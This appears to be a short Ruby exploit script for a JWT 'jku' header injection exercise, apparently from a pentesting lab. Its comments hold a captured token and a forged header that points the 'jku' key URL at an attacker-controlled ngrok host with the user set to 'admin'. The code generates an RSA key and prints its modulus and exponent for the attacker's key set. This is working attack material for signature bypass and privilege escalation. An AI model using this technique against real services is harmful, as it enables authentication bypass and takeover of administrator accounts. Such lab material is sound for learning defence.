# http://ptl-17994f50-32958416.libcurl.so/redirect?redirect_uri=/login

# eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9wdGwtMTc5OTRmNTAtMzI5NTg0MTYubGliY3VybC5zby8ud2VsbC1rbm93bi8vandrcy5qc29uIn0.eyJ1c2VyIjoiZGVtb0BkZW1vLmNvbSJ9.iY49rMF09NgA_xUmz34a2N7c3HGLgKx0wAJ5ihJe7Pw8Vm-hpBu0S_xQC2BRI-aNjBRVUGbT1tYiUi8S4QcZQbeFHhxi4G8JmrlkaNdsiVBZ7EOS5PxUbv9Q2LDwcHY54MBSrRk5jKCNeuLXIyGJzqqhxuT-z46W8cq3q8l6VWf3BFj0vNEW1_sbCSdrBy0gFuepZ544A1e9s5YYjR_6jYSunwxONHqOI5lhotB7Q5azboZVQirovVJvZTbD90gv5wkAjeEMpluBwJT7aT9ECPMjn4fiUoJjH1sD2zry_lRtqRY_30M8M_ax9N7SjrUB4G9nQ9QDPuP9KAsYV6FBDA
require 'openssl'
require 'base64'
require 'json'

# header = {"typ":"JWT","alg":"RS256","jku":"https://f3e6-73-129-14-72.ngrok.io/mykey.json"} # insert public server with key (can get the format from the original "jku")
# payload = {"user":"admin"}

priv=OpenSSL::PKey::RSA.new File.read 'private.pem' # openssl genrsa -out private.pen 2048 

pub = priv.public_key
n=Base64.urlsafe_encode64(pub.n.to_s(2), padding:false).gsub(/=+$/,"")
e=Base64.urlsafe_encode64(pub.e.to_s(2), padding:false).gsub(/=+$/,"")

puts n
puts e